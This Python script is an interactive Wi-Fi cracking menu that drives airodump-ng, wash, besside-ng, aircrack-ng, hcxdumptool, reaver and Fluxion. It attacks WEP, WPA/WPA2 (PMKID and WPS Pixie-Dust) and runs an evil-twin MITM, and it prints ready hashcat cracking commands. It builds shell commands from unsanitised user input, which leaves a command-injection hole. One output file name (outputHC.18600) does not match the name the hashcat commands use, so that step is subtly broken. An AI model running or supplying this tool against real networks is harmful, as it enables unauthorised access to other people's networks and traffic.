import os
from colorama import Fore, Style


interface = input(Fore.CYAN + '[*]Enter interface to use: ' + Style.RESET_ALL)
os.system('airmon-ng start ' + interface)

def wait():
  wait = input('PRESS ENTER TO CONTINUE')

def main():
  print('       _   __     __      ______     ______       __')
  print('      / | / /__  / /_    / ____/____/ ____ \_____/ /__')
  print('     /  |/ / _ \/ __/   / /   / ___/ / __ `/ ___/ //_/')
  print('    / /|  /  __/ /_    / /___/ /  / / /_/ / /__/ ,<')
  print('   /_/ |_/\___/\__/____\____/_/   \ \__,_/\___/_/|_|')
  print('                 /_____/           \____/')
  print('==========================================================')
  print('*[1] Scan Local Networks (Airodump-ng)                   *')
  print('*[2] Scan Local Networks (Wash)                          *')
  print('*[3] Crack WEP Network                                   *')
  print('*[4] Crack WPA/WPA2 Network Using PMKID Method           *')
  print('*[5] Crack WPA/WPA2 Network Using PIN (Pixie-Dust) Method*')
  print('*[6] MITM WPA/WPA2 Method                                *')
  print('*[7] Exit                                                *')
  print('==========================================================')
  in_put = input(': ')
  if in_put == '1':
    print(Fore.CYAN + '[*]Make sure to note down network bssid and channel number...')
    print('[*]Enter ^C or ^Z to exit scanner mode...' + Style.RESET_ALL)
    os.system('airodump-ng ' + interface + 'mon')
    wait()
    main()
  if in_put == '2':
    print(Fore.CYAN + '[*]Make sure to note down network bssid and channel number...')
    print('[*]Enter ^C or ^Z to exit scanner mode...' + Style.RESET_ALL)
    os.system('wash -i ' + interface + 'mon')
    wait()
    main()
  if in_put == '3':
    bssid = input(Fore.CYAN + '[*]Enter WEP Network BSSID: ' + Style.RESET_ALL)
    channel = input(Fore.CYAN + '[*]Enter WEP Network Channel: ' + Style.RESET_ALL)
    print(Fore.CYAN + '[*]Gathering Packets From Network: ' + bssid + '... (Wait Until You Have About 1000 IVs)' + Style.RESET_ALL)
    os.system('besside-ng -b ' + bssid + ' -c ' + channel + ' ' + interface + 'mon')
    os.system('aircrack-ng wep.pcap')
    wait()
    main()
  if in_put == '4':
    adapt = input(Fore.CYAN + '[*]Do you have a wifi adapter with packet injection?[y/N]: ' + Style.RESET_ALL)
    if adapt == 'y' or adapt == 'Y':
      bssid = input(Fore.CYAN + '[*]Enter WPA/WPA2 Network BSSID: ' + Style.RESET_ALL)
      channel = input(Fore.CYAN + '[*]Enter WPA/WPA2 Network Channel: ' + Style.RESET_ALL)
      print(Fore.CYAN + '[*]Starting PMKID Attack...')
      print('[*]Wait about 10 minutes to gather enough packets, use ^C or ^Z to end hcxdumptool...' + Style.RESET_ALL)
      os.system('hcxdumptool -i ' + interface + 'mon -o output.pcapng --enable_status=1')
      print(Fore.CYAN + '[*]Converting output.pcapng to ouputHC.16800 for hashcat bruteforcing...' + Style.RESET_ALL)
      os.system('hcxpcaptool -E essidlist -I identitylist -U usernamelist -z outputHC.18600 output.pcapng')
      print(Fore.GREEN + '[+]File Converted! Use hashcat in these two methods to crack: ' + Style.RESET_ALL)
      print(Fore.CYAN + '  [*]  Wordlist: hashcat -m 16800 outputHC.16800 -a 0 --force wordlist.lst -O')
      print(Fore.CYAN + '  [*]Bruteforce: hashcat -m 16800 outputHC.16800 -a 3 --force ?a?a?a?a?a?a -O')
      wait()
      main()
    else:
      print(Fore.RED + "[*]You can't attack a WPA/WPA2 encrypted network without packet injection..." + Style.RESET_ALL)
      wait()
      main()
  if in_put == '5':
    bssid = input(Fore.CYAN + '[*]Enter Network BSSID: ' + Style.RESET_ALL)
    channel = input(Fore.CYAN + '[*]Enter Network Channel: ' + Style.RESET_ALL)
    print(Fore.CYAN + '[*]Running Reaver to attack WPS PIN exploit...' + Style.RESET_ALL)
    os.system('reaver -i ' + interface + 'mon -b ' + bssid + ' -c ' + channel + '  -vv -Z')
    wait()
    main()
  if in_put == '6':
    warn = input(Fore.RED + '[*]Fluxion can only run in a graphical interface (no ssh). Are you running in a gui?[y/N]: ' + Style.RESET_ALL)
    if warn == 'y' or warn == 'Y':
      os.chdir('fluxion')
      os.system('sudo ./fluxion.sh')
      os.chdir('..')
      wait()
      main()
    else:
      print(Fore.RED + '[*]Run Fluxion in a gui...' + Style.RESET_ALL)
      wait()
      main()
  if in_put == '7':
    wait()
    exit()

main()
